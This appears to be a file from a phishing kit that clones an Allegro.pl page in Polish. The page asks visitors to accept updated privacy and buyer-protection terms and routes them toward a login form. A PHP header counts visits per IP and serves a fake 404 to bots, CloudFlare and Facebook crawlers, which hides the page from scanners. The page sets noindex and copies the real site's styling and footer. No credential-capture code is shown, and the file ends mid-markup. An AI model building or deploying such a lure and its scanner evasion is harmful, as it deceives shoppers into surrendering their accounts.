<?php
session_start();

if(isset($_SESSION['anty'])) {
	$_SESSION['anty'][$_SERVER['REMOTE_ADDR']] = $_SESSION['anty'][$_SERVER['REMOTE_ADDR']]+1;
} else {
	$_SESSION['anty'] = array($_SERVER['REMOTE_ADDR'] => 1);
}

// blokada kilku botow
if(preg_match('/bot|CloudFlare|facebook|crawl|slurp|spider|mediapartners/i', $_SERVER['HTTP_USER_AGENT'])){
	header('HTTP/1.0 404 Not Found');
	exit("404 Not Found");
}


?><!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="pl"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <title>Allegro.pl - Więcej niż aukcje. Najlepsze oferty na największej platformie handlowej.</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
	<meta name="robots" content="noindex,nofollow">
	<meta http-equiv="Expires" content="0" />
	<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate" />
	<meta http-equiv="Cache-Control" content="post-check=0, pre-check=0" />
	<meta http-equiv="Pragma" content="no-cache" />
	<link rel="shortcut icon" href="./all_pliki/favicon.ico">
    <link rel="stylesheet" href="./all_pliki/fonts.css">
    <link href="./all_pliki/main-feb4be0d.css" rel="stylesheet">
	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
</head>
<body class="m-margin-0">
    <div class="opbox-fragment">
	
<link type="text/css" rel="stylesheet" href="./all_pliki/main-9b55cb7259.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-b5dfee8649.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-eb11b40fe2.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-64c8a69d56.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-2a07c96867.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-9969869d00.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-97a734f309.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-ca2dd39c93.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-abf85989fc.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-64311a4761.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-e5991a6c31.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-8b9dedf667.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-faa7f875a0.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-42f70be108.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-aa165ec878.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-d1ea75d870.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-21da3ff57d.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-ee3aa8a8a8.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-ba1fbbde21.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-fae11fa7a8.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-05f4014213.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-ab49cfd01c.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-9e70607b33.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-db7086ad85.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-121547dfb6.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-d921924d25.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-0b00427525.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-934e3048a4.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/main-f8a26dfd01.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__99422d2d.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__7db1a711.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__0e8de9da.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__95686def.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__e60963bc.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__6a0fc62a.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/fonts-c27b1842da.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/metrum-header-84aaa586ed.css">

<div class="fee54_1GCN7"><a name="allegro-metrumheader"></a>
    <nav class="fee54_1QSsP fee54_2XH3Q _ourew _1px3d _d6da7 opbox-metrum-header--default fee54_394cN ">
      <div class="opbox-metrum-header__center fee54_2LIih fee54_1Wk4P fee54_1wDui _1sd8w _g1a3g _1bwbg  ">
        <h2 itemscope="" itemtype="http://schema.org/Organization" class="fee54_2cV2n " data-description="header logo">
        <a href="javascript:void(0)" class="_sm3us " title="Allegro.pl - wygodne i bezpieczne zakupy online, największy wybór ofert">
      <img class="fee54_39J9B " src="./all_pliki/allegro-347440b030.svg" alt="Allegro.pl - wygodne i bezpieczne zakupy online, największy wybór ofert" itemprop="logo">
    </a>
        
     </h2>
        
        
        <div class="fee54_1Njt4  ">  <div class="fee54_1Uwxm "></div> 
        <div class="_1caf7  fee54_1Uwxm">
            
    
    <button type="button" class="_iu5pr _13q9y _1us1q _1yk0g fee54_3GU3E opbox-metrum-header__account-name-loaded fee54_3U14k ">
      <span class="fee54_3VuhJ opbox-metrum-header__account-name-wrapper" data-description="header account name">Moje Allegro</span><svg class="fee54_AA0SO _183de"><image xlink:href="./all_pliki/user-a2ad83622c.svg" width="100%" height="100%"></image></svg><span class="_4fbj1 _nm6g1 fee54_2k3Nf"></span> 
      <i class="fee54_3VuhJ opbox-metrum-header__icon-toggle _183de _121f1 _1f16d"></i>
    </button>
	

	 
	 
	 
        </div>
    </div>
      </div>
      
      
    </nav>
  </div><div><a name="allegro-performance-mark"></a></div>

</div>
    <div class="ng-scope">
        <!-- uiView: undefined --><ui-view class="ng-scope"><div class="m-desk ng-scope">
    <div class="m-desk__content m-width-max m-align-block-center">
        <div id="scrollAnchor" class="m-grid m-flex-justify-center">
            <main id="main-grid" class="m-grid__col  m-grid__col--12 m-grid__col--8@md m-grid__col--10@lg">
                <div class="m-grid">
                    <!--Login Main Form-->
                    <section class="m-grid__col m-grid__col--12 m-order-first@md m-margin-bottom-16 m-grid__col--offset-2@lg m-grid__col--8@lg m-grid__col--6@xl m-grid__col--offset-0@xl">
                        <div class="m-width-fluid m-display-flex m-flex-column">

                            <!--Login Main Form - Inputs -->
                            <section class="m-card m-flex-auto">

                                <h2 class="m-heading m-heading--md m-type--capitalize-first m-display-inline-block"><span class="ng-scope">Prosimy o zapoznanie się z aktualizacją regulaminu</span></h2>

                             </br>
						<h3>	 Zmiany dotyczą :</h3>
						<br> <a target="_blank" href="https://allegro.pl/regulamin/pl/zalacznik-5">Polityki ochrony prywatności</a>
						<br> <a target="_blank" href="https://allegro.pl/regulamin/pl/zalacznik-9">Programu ochrony kupujących</a>
						
						
						

                                    <!--Skycaptcha-->
                                    <!-- ngIf: loginFailure.showCaptcha -->

                                    <!--Login Buttons-->
                                    <div class="m-margin-top-32 m-width-fluid m-flex-self-end">
                                        <div class="m-display-flex m-flex-column m-flex-row@sm  m-flex-wrap-reverse m-flex-justify-end">
                                            <!--Social Buttons-->
<a href="https://allegro.pl/login/form?authorization_uri">
                                            <!--Login Button-->
                                            <button id="login-button" tabindex="4" type="submit" class="m-button m-button--primary m-button--spinner m-width-fluid m-width-auto@sm m-flex-order-first m-flex-order-last@sm btn--wide"><!-- ngIf: showLoginFormSpinner --><span class="ng-binding ng-scope">Akceptuję</span></button> </a>
                                        </div>
                                    </div>

                                    <!--One Time Password-->
                                    <!-- ngIf: oneTimePassword.showRequired() -->

                                    <!--Form Expired-->
                                    <!-- ngIf: loginFailure.formExpired || loginFailure.pendingRegistrationEmail -->
                                </form>
                            </section>

                            <!--Login Main Form - Register Button -->
                            <section class="m-card m-margin-top-16 m-display-flex m-flex-grow-0">
                                <h5 class="m-heading m-heading--xs m-margin-0 m-display-inline-block m-flex-self-center margin-bottom-zero">Nie masz konta?</h5>
                               <a id="new-account-link" href="javascript:void(0)" class="m-link m-link--non-visited m-type m-type--uppercase m-margin-left-16 m-flex-self-center ng-scope" span class="ng-scope">zarejestruj się</span></a>
                            </section>
                        </div>
                    </section>

                    <!--Adds Section-->
                    <section class="m-display-none m-display-flex@xl m-grid__col m-grid__col--8@lg m-grid__col--offset-2@lg m-grid__col--6@xl m-grid__col--offset-0@xl m-margin-bottom-16">
                        <div class="m-width-fluid m-card m-padding-left-0 m-padding-right-0 m-padding-top-16 m-padding-bottom-16">
                            <div ng-show="formData.showAd" class="ads">
                                <div class="m-display-flex m-flex-justify-center" id="ads">
                                    <dfp dfp-config="formData.addsConfig" class="ng-isolate-scope"><div id="login_page_500_380" style="" data-google-query-id="CLzg5-C05t4CFcSXGAodXmMNRQ"><div></div></div></dfp>
                                </div>
                            </div>
                        </div>
                    </section>

                    <!--Buy Without Account-->
                    <section class="m-grid__col m-grid__col--12 m-grid__col--6@md m-order-last m-order-first@md m-margin-bottom-16 m-display-none">
                        <div class="m-width-fluid m-card">
                            <h3 class="m-heading m-heading--md m-type--capitalize-first m-display-inline-block m-margin-bottom-32"><span class="ng-binding ng-scope">Nie masz konta?</span></h3>

                            <section class="m-margin-bottom-24">
                                <div class="m-display-flex m-margin-bottom-16">
                                    <!-- ngIf: !showBuyAsGuestSpinner --><p id="guest-form-buy-btn" class="m-color-teal m-align-block-center m-type m-type--uppercase m-link ng-binding ng-scope">
                                        Kup bez konta
                                    </p><!-- end ngIf: !showBuyAsGuestSpinner -->
                                    <!-- ngIf: showBuyAsGuestSpinner -->
                                </div>
                                <!-- ngIf: shouldActivateGuestCaptcha() -->
                                <div class="m-display-flex m-flex-items-center m-margin-bottom-16">
                                    <hr class="m-divider m-divider--gutter">
                                    <span class="m-type m-type--small m-color-gray m-padding-left-8 m-padding-right-8 m-white-space-nowrap">lub</span>
                                    <hr class="m-divider m-divider--gutter">
                                </div>

                                <div class="m-display-flex">
                                    <a href="javascript:void(0)" class="m-link m-link--non-visited m-align-block-center m-type m-type--uppercase ng-binding" type="button" ng-click="sendSignUpAfterOrderAsAGuestEvent()" id="guest-form-register-btn">
                                        Zarejestruj się
                                    </a>
                                </div>
                            </section>

                            <section class="m-width-fluid m-display-flex">
                                <div class="m-align-block-center">
                                    <h5 class="m-heading m-heading--xs m-margin-bottom-16 ng-binding">
                                        Co zyskasz:
                                    </h5>

                                    <ul style="list-style: none;" class="m-padding-left-0 m-type m-type--small m-color-gray">
                                        <li class="m-display-flex" style="height: 28px;"><i icons-metrum=""><svg width="0" height="0" style="position:absolute">
    <filter id="m-color-filter-orange" color-interpolation-filters="sRGB">
        <feColorMatrix values="0 0 0 0 1 0 0 0 0 0.352 0 0 0 0 0 0 0 0 1 0"></feColorMatrix>
    </filter>
</svg>
<svg class="m-icon m-padding-bottom-4 m-padding-top-0">
    <image xlink:href="./all_pliki/done-946bfbe034.svg" class="m-color-filter-orange" width="75%" height="75%"></image>
</svg></i><span class="m-flex-self-center  ng-binding">Darmowa dostawa i inne korzyści w Allegro Smart!</span></li>
                                        <li class="m-display-flex" style="height: 28px;"><i icons-metrum=""><svg width="0" height="0" style="position:absolute">
    <filter id="m-color-filter-orange" color-interpolation-filters="sRGB">
        <feColorMatrix values="0 0 0 0 1 0 0 0 0 0.352 0 0 0 0 0 0 0 0 1 0"></feColorMatrix>
    </filter>
</svg>
<svg class="m-icon m-padding-bottom-4 m-padding-top-0">
    <image xlink:href="./all_pliki/done-946bfbe034.svg" class="m-color-filter-orange" width="75%" height="75%"></image>
</svg></i><span class="m-flex-self-center  ng-binding">Możliwość śledzenia przesyłek</span></li>
                                        <li class="m-display-flex" style="height: 28px;"><i icons-metrum=""><svg width="0" height="0" style="position:absolute">
    <filter id="m-color-filter-orange" color-interpolation-filters="sRGB">
        <feColorMatrix values="0 0 0 0 1 0 0 0 0 0.352 0 0 0 0 0 0 0 0 1 0"></feColorMatrix>
    </filter>
</svg>
<svg class="m-icon m-padding-bottom-4 m-padding-top-0">
    <image xlink:href="./all_pliki/done-946bfbe034.svg" class="m-color-filter-orange" width="75%" height="75%"></image>
</svg></i><span class="m-flex-self-center  ng-binding">Tańsze zakupy z Monetami</span></li>
                                        <li class="m-display-flex" style="height: 28px;"><i icons-metrum=""><svg width="0" height="0" style="position:absolute">
    <filter id="m-color-filter-orange" color-interpolation-filters="sRGB">
        <feColorMatrix values="0 0 0 0 1 0 0 0 0 0.352 0 0 0 0 0 0 0 0 1 0"></feColorMatrix>
    </filter>
</svg>
<svg class="m-icon m-padding-bottom-4 m-padding-top-0">
    <image xlink:href="./all_pliki/done-946bfbe034.svg" class="m-color-filter-orange" width="75%" height="75%"></image>
</svg></i><span class="m-flex-self-center  ng-binding">Wsparcie po zakupie</span></li>
                                    </ul>
                                </div>
                            </section>

                        </div>
                    </section>

                    <!--Regulamin-->
                    <section class="m-grid__col m-grid__col--12 m-grid__col--6@xl m-margin-bottom-16 m-grid__col--8@lg m-grid__col--offset-2@lg m-grid__col--offset-0@xl">

                    </section>

                    <!--USP Section-->
                    <section class="m-grid__col m-grid__col--12 m-grid__col--12@xl m-order-last">
                        <div class="m-grid">
                            <div class="m-grid__col m-grid__col--12 m-margin-bottom-8 m-grid__col--4@lg">
                                <a href="javascript:void(0)" class="m-card m-width-fluid m-link m-type m-type--spacer-bottom m-display-flex m-flex-column@lg m-flex-items-center">
                                    <img src="./all_pliki/wow-offer-a8cea65e64.svg" class="m-icon m-icon--usp m-flex-shrink-0 m-margin-right-8 m-margin-0@lg">
                                    <div class="m-width-fluid m-align-text-center@lg m-margin-top-16@lg">
                                        <h4 class="m-heading m-heading--xs"><span class="ng-scope">Najlepsze ceny</span></h4>
                                        <p class="m-type m-type--paragraph"><span class="ng-scope">100 tysięcy sklepów konkuruje o Twoją uwagę.</span></p>
                                    </div>
                                </a>
                            </div>
                            <div class="m-grid__col m-grid__col--12 m-margin-bottom-8 m-grid__col--4@lg">
                                <a href="javascript:void(0)" class="m-card m-width-fluid m-link m-type m-type--spacer-bottom m-display-flex m-flex-column@lg m-flex-items-center">
                                    <img src="./all_pliki/much-offer-e1755ea681.svg" class="m-icon m-icon--usp m-flex-shrink-0 m-margin-right-8 m-margin-0@lg">
                                    <div class="m-width-fluid m-align-text-center@lg m-margin-top-16@lg">
                                        <h4 class="m-heading m-heading--xs"><span class="ng-scope">Największy wybór</span></h4>
                                        <p class="m-type m-type--paragraph"><span class="ng-scope">95 milionów produktów w jednym miejscu.</span></p>
                                    </div>
                                </a>
                            </div>
                            <div class="m-grid__col m-grid__col--12 m-margin-bottom-8 m-grid__col--4@lg">
                                <a href="javascript:void(0)" class="m-card m-width-fluid m-link m-type m-type--spacer-bottom m-display-flex m-flex-column@lg m-flex-items-center">
                                    <img src="./all_pliki/such-safe-d7c304b8d6.svg" class="m-icon m-icon--usp m-flex-shrink-0 m-margin-right-8 m-margin-0@lg">
                                    <div class="m-width-fluid m-align-text-center@lg m-margin-top-16@lg">
                                        <h4 class="m-heading m-heading--xs"><span class="ng-scope">Zawsze bezpiecznie</span></h4>
                                        <p class="m-type m-type--paragraph"><span class="ng-scope">Zwrot zakupów i ochrona Kupującego dla każdego.</span></p>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </section>

                </div>
            </main>
        </div>
    </div>
</div></ui-view>
    </div>
    <div class="opbox-fragment">

<link type="text/css" rel="stylesheet" href="./all_pliki/index__fbeb8e16.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__7428d9e6.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__e0db738c.css">
<link type="text/css" rel="stylesheet" href="./all_pliki/index__cf99d7ba.css">

<div      ><a name="metrum-footer-partial"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper _26e29_ix2OZ full-width ">  <div class="_26e29_2IhX3 opbox-sheet " style="background: white;"> <div      ><a name="metrum-footer-partial-expander"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper _26e29_ix2OZ full-width ">  <div class="_26e29_2IhX3 opbox-sheet " style="background: #eceff1;"> <div     ><a name="f-expander"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet _26e29_2fPDv card " style=""> <div         ><a name="f-expander-wrapper"></a>
    <div class="_09158_7iIwZ">
	
	
	
      <div class="_09158_DcN16" style="max-height: 175px">
            <div><div data-box-name="f-expander-columns" data-prototype-id="layout.grid" data-prototype-version="5.0" data-implementation-version="1.8.0" data-analytics-category="layout.grid"  ><a name="f-expander-columns"></a><div class="_1yyhi e8a20_2xBJD"><div class="e8a20_2iPrm _3kk7b _t0xzz _1h8s6 _knu61 _1t6t8 _m44ca _35enf"><div data-box-name="f-expander-column1"    ><a name="f-expander-column1"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""><div class="_26e29_IeIDK header-wrapper"><h3 class="_26e29_1gRjc container-header _26e29_3XiVb size-5">Polecamy </h3></div> <div data-box-name="f-expander-list1"        ><a name="f-expander-list1"></a><div class=" _2508c_28Qkl _2508c_9j5CR js-navigation-links "><ul class="_2508c_3i9p- _2508c_2Fw19 _3a4zn _1sql3 _1rj80 _ourew _12vfa"><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Opony zimowe">Opony zimowe</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Kawa ziarnista">Kawa ziarnista</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Tania biżuteria">Tania biżuteria</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Oczyszczacze powietrza">Oczyszczacze powietrza</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Telewizory OLED" data-analytics-click-custom-index-0="4">Telewizory OLED</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Ciekawe książki" data-analytics-click-custom-index-0="5">Ciekawe książki</a></li></ul></div></div> </div></div></div></div><div class="e8a20_2iPrm _3kk7b _t0xzz _1h8s6 _knu61 _1t6t8 _m44ca _35enf"><div data-box-name="f-expander-column2"    ><a name="f-expander-column2"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""><div class="_26e29_IeIDK header-wrapper"><h3 class="_26e29_1gRjc container-header _26e29_3XiVb size-5">Nowości </h3></div> <div data-box-name="f-expander-list2"        ><a name="f-expander-list2"></a><div class=" _2508c_28Qkl _2508c_9j5CR js-navigation-links "><ul class="_2508c_3i9p- _2508c_2Fw19 _3a4zn _1sql3 _1rj80 _ourew _12vfa"><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="iPhone XS">iPhone XS</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Red Dead Redemption 2">Red Dead Redemption 2</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Samsung Galaxy Note 9">Samsung Galaxy Note 9</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Sony XPERIA XZ3">Sony XPERIA XZ3</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Assassin's Creed Odyssey" data-analytics-click-custom-index-0="4">Assassin's Creed Odyssey</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Call of Duty Black Ops 4" data-analytics-click-custom-index-0="5">Call of Duty Black Ops 4</a></li></ul></div></div> </div></div></div></div><div class="e8a20_2iPrm _3kk7b _t0xzz _1h8s6 _knu61 _1t6t8 _m44ca _35enf"><div data-box-name="f-expander-column3"    ><a name="f-expander-column3"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""><div class="_26e29_IeIDK header-wrapper"><h3 class="_26e29_1gRjc container-header _26e29_3XiVb size-5">Trendy </h3></div> <div         ><a name="f-expander-list3"></a><div class=" _2508c_28Qkl _2508c_9j5CR js-navigation-links "><ul class="_2508c_3i9p- _2508c_2Fw19 _3a4zn _1sql3 _1rj80 _ourew _12vfa"><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Maski antysmogowe">Maski antysmogowe</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Świąteczne swetry">Świąteczne swetry</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Buty zimowe">Buty zimowe</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Suszarki do grzybów">Suszarki do grzybów</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Opony samochodowe" data-analytics-click-custom-index-0="4">Opony samochodowe</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Sprzęt turystyczny w góry" data-analytics-click-custom-index-0="5">Sprzęt turystyczny w góry</a></li></ul></div></div> </div></div></div></div><div class="e8a20_2iPrm _3kk7b _t0xzz _1h8s6 _knu61 _1t6t8 _m44ca _35enf"><div data-box-name="f-expander-column4"    ><a name="f-expander-column4"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""><div class="_26e29_IeIDK header-wrapper"><h3 class="_26e29_1gRjc container-header _26e29_3XiVb size-5">Wyjątkowe okazje </h3></div> <div data-box-name="f-expander-list4"        ><a name="f-expander-list4"></a><div class=" _2508c_28Qkl _2508c_9j5CR js-navigation-links "><ul class="_2508c_3i9p- _2508c_2Fw19 _3a4zn _1sql3 _1rj80 _ourew _12vfa"><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Pomysły na prezent">Pomysły na prezent</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Kalendarz adwentowy">Kalendarz adwentowy</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Andrzejki">Andrzejki</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us" href="javascript:void(0)" title="Prezenty na mikołajki">Prezenty na mikołajki</a></li></ul></div></div> </div></div></div></div>
			
			</div></div></div>
          </div>
		  
		  
		  
		  
      
      <hr class="_d7szm">
      
    </div>
  </div> </div></div></div> </div></div></div><div data-box-name="f-links"    ><a name="f-links"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet _26e29_2fPDv card " style=""> <div data-box-name="f-links-columns" data-prototype-id="layout.grid" data-prototype-version="5.0" data-implementation-version="1.8.0" data-analytics-category="layout.grid"  ><a name="f-links-columns"></a><div class="_1yyhi e8a20_2xBJD"><div class="e8a20_2iPrm _3kk7b _vnd3k _1h8s6 _n1rmb _1nucm _m44ca _35enf"><div data-box-name="f-links-column1"    ><a name="f-links-column1"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""><div class="_26e29_IeIDK header-wrapper"><h3 class="_26e29_1gRjc container-header _26e29_1j53J size-4">Allegro </h3></div> <div data-box-name="f-links-list1"        data-visible-for="147"><a name="f-links-list1"></a><div class=" _2508c_28Qkl _2508c_9j5CR js-navigation-links "><ul class="_2508c_3i9p- _2508c_2Fw19 _3a4zn _1sql3 _1rj80 _ourew _12vfa"><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="O nas">O nas</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Reklama">Reklama</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Allegro Ads">Allegro Ads</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Praca">Praca</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Społeczna Odpowiedzialność" data-analytics-click-custom-index-0="4">Społeczna Odpowiedzialność</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Mapa strony" data-analytics-click-custom-index-0="5">Mapa strony</a></li></ul></div></div> </div></div></div></div><div class="e8a20_2iPrm _3kk7b _vnd3k _1h8s6 _n1rmb _1nucm _m44ca _35enf"><div data-box-name="f-links-column2"    ><a name="f-links-column2"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""><div class="_26e29_IeIDK header-wrapper"><h3 class="_26e29_1gRjc container-header _26e29_1j53J size-4">Centrum pomocy </h3></div> <div data-box-name="f-links-list2-rodo"        data-visible-for="147"><a name="f-links-list2-rodo"></a><div class=" _2508c_28Qkl _2508c_9j5CR js-navigation-links "><ul class="_2508c_3i9p- _2508c_2Fw19 _3a4zn _1sql3 _1rj80 _ourew _12vfa"><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Pomoc">Pomoc</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Dla kupujących">Dla kupujących</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="https://allegro.pl/dla-sprzedajacych" title="Dla sprzedających">Dla sprzedających</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Polityka plików &quot;cookies&quot;">Polityka plików "cookies"</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Regulamin" data-analytics-click-custom-index-0="4">Regulamin</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Dopasowanie reklam" data-analytics-click-custom-index-0="5">Dopasowanie reklam</a></li></ul></div></div> </div></div></div></div><div class="e8a20_2iPrm _3kk7b _vnd3k _1h8s6 _n1rmb _1nucm _m44ca _35enf"><div data-box-name="f-links-column3"    ><a name="f-links-column3"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""><div class="_26e29_IeIDK header-wrapper"><h3 class="_26e29_1gRjc container-header _26e29_1j53J size-4">Serwisy </h3></div> <div data-box-name="f-links-list3"        data-visible-for="147"><a name="f-links-list3"></a><div class=" _2508c_28Qkl _2508c_9j5CR js-navigation-links "><ul class="_2508c_3i9p- _2508c_2Fw19 _3a4zn _1sql3 _1rj80 _ourew _12vfa"><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Allegro Smart!">Allegro Smart!</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Strefa marek">Strefa marek</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Artykuły">Artykuły</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Archiwum Allegro">Archiwum Allegro</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Monety Allegro" data-analytics-click-custom-index-0="4">Monety Allegro</a></li><li class="_1bmp9 _1tq4i _ourew  "><a class="_sm3us _1241k" href="javascript:void(0)" title="Karty Allegro" data-analytics-click-custom-index-0="5">Karty Allegro</a></li></ul></div></div> </div></div></div></div><div class="e8a20_2iPrm _3kk7b _vnd3k _1h8s6 _fdr6w _umw2u _m44ca _35enf"><div data-box-name="f-links-column4"    ><a name="f-links-column4"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""> <div data-box-name="f-social"    ><a name="f-social"></a><div class="_26e29_3TEPn v2144 _26e29_1bLR9 opbox-sheet-wrapper ">  <div class="_26e29_2IhX3 opbox-sheet " style=""> <div data-box-name="f-social-columns" data-prototype-id="layout.grid" data-prototype-version="5.0" data-implementation-version="1.8.0" data-analytics-category="layout.grid"  ><a name="f-social-columns"></a><div class="_1yyhi e8a20_2xBJD e8a20_1wuG8"><div class="e8a20_2iPrm _3kk7b _vnd3k _1nwls _alw8w _1s5uu"><div data-box-name="f-social-apps" data-prototype-id="allegro.socialButtons" data-prototype-version="1.3" data-skin-class-name="social-buttons" data-implementation-version="0.9.1"  data-analytics-category="allegro.socialButtons"   ><a name="f-social-apps"></a><div class="cb2a5_1fncB   " data-role=""><svg width="0" height="0"><filter id="social-filter-teal" color-interpolation-filters="sRGB"><feColorMatrix values="0 0 0 0 0.4625 0 0 0 0 0.4625 0 0 0 0 0.4625 0 0 0 1 